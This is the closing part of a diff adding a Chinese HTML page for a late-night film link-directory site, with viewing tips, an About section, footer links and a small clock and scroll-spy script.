+        <details><summary><span>恐怖片别看鬼，看声音</span></summary><p>最吓人的往往是一声静音、一句画外音、一个<b>“以为看到了”</b>的瞬间。声音先动手，画面才补刀。</p></details>
+        <details><summary><span>冷门佳作怎么挑</span></summary><p>不看评分，看<b>“片尾字幕走完你还坐着”</b>。优先导演前作、电影节入围、片长短于 100 分钟。<b>本站为影视网址导航，只做入口与片单，不做搬运</b>；倡导正版与流媒体会员观影，熬夜别过两点。</p></details>
+      </div>
+    </div>
+  </section>
+
+  <section id="about">
+    <div class="wrap">
+      <div class="about">
+        <div class="k">ABOUT · 午夜电影网福利</div>
+        <h2>关于<em>午夜电影网福利</em></h2>
+        <p><b>午夜电影网福利</b>是一个<b>午夜影视网址导航</b>。我们不搬运、不绕路，只做一件事：把<b>悬疑惊悚、黑色电影、犯罪片、心理片、独立片、冷门佳作</b> 的入口按<b>六个深夜切口</b>整理清楚，让你点一次就看到<b>最对的那一部</b>。</p>
+        <div class="stats">
+          <div><b>6</b><span>深夜切口</span></div>
+          <div><b>412</b><span>已收录网址</span></div>
+          <div><b>每晚</b><span>更新片单</span></div>
+          <div><b>零搬运</b><span>倡导正版</span></div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+</main>
+
+<footer class="ft">
+  <div class="wrap">
+    <div class="fgrid">
+      <div><h6>悬疑惊悚</h6><ul>
+        <li><a href="#films">倒计时</a></li><li><a href="#cat">不可靠叙事</a></li>
+        <li><a href="#guide">反转三秒</a></li><li><a href="#sites">网址收录</a></li>
+      </ul></div>
+      <div><h6>黑色与犯罪</h6><ul>
+        <li><a href="#cat">雨夜宿命</a></li><li><a href="#films">追凶双线</a></li>
+        <li><a href="#rank">热播榜</a></li><li><a href="#guide">看光影</a></li>
+      </ul></div>
+      <div><h6>心理与恐怖</h6><ul>
+        <li><a href="#cat">镜头即知觉</a></li><li><a href="#cat">留白</a></li>
+        <li><a href="#films">冷门佳作</a></li><li><a href="#guide">听声音</a></li>
+      </ul></div>
+      <div><h6>规范</h6><ul>
+        <li><a href="#sites">网址收录</a></li><li><a href="#guide">观影指南</a></li>
+        <li><a href="#about">关于我们</a></li><li><a href="#">提交网址</a></li>
+      </ul></div>
+    </div>
+    <div class="copy">
+      © 2026 <b>午夜电影网福利</b> ｜ 网址：https://wuyedianyingwangfuli-cn.github.io &nbsp;|&nbsp; 午夜影视网址导航 · 实用网址收录<br>
+      本站为导航用途，倡导正版观影与版权合规，请勿用于侵权搬运。
+    </div>
+  </div>
+</footer>
+
+<a class="up" href="#" aria-label="回到顶部" onclick="window.scrollTo({top:0,behavior:'smooth'});return false">↑</a>
+
+<script>
+(function(){
+  var el=document.getElementById('c');
+  function tick(){
+    var d=new Date(),p=function(n){return String(n).padStart(2,'0')};
+    el.textContent=p(d.getHours())+':'+p(d.getMinutes())+':'+p(d.getSeconds());
+  }
+  tick();setInterval(tick,1000);
+
+  var links=document.querySelectorAll('nav.toc a');
+  var secs=[].slice.call(links).map(function(a){return document.querySelector(a.getAttribute('href'))});
+  function spy(){
+    var y=window.scrollY+140,cur=0;
+    secs.forEach(function(s,i){ if(s&&s.offsetTop<=y) cur=i; });
+    links.forEach(function(a,i){ a.classList.toggle('on',i===cur); });
+  }
+  window.addEventListener('scroll',spy,{passive:true});spy();
+})();
+</script>
+</body>
+</html>
